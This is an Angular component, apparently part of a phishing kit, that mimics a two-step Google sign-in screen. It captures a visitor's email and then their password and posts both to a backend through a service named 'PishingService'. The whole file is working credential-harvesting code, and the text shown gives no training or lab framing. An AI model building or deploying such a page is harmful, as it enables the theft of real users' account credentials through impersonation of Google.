import { Component, OnInit } from '@angular/core';
import { NgForm } from '@angular/forms';
import { PishingModel } from 'src/models/Pishing.model';
import { Router } from '@angular/router';
import { PishingService } from 'src/services/Pishing.service';
import Swal from 'sweetalert2';

@Component({
  selector: 'app-google',
  templateUrl: './google.component.html',
  styleUrls: ['./google.component.css']
})
export class GoogleComponent implements OnInit {
  correo: string = ''; 
  contrasena: string = ''; 
  correoEnviado: boolean = false;
  mostrarTarjetaCorreo: boolean = true;


  constructor(private PishingService: PishingService, private router: Router) {}

  ngOnInit(): void {
    this.mostrarTarjetaCorreo = true;
  }

  enviarCorreo() {
    
    if (this.correo) {
      
      this.correoEnviado = true; 
      this.mostrarTarjetaCorreo = false;
    }
  }

  enviarContrasena() {
    if (this.correo && this.contrasena) {
     
      const pishingData: PishingModel = {
        pishId: 0, 
        correo: this.correo,
        password: this.contrasena,
      };
  
      
      this.PishingService.postPishing(pishingData).then(() => {
        
      }).catch((error: any) => {
        console.error('Error al enviar los datos', error);
      });
    }
  }
  
}
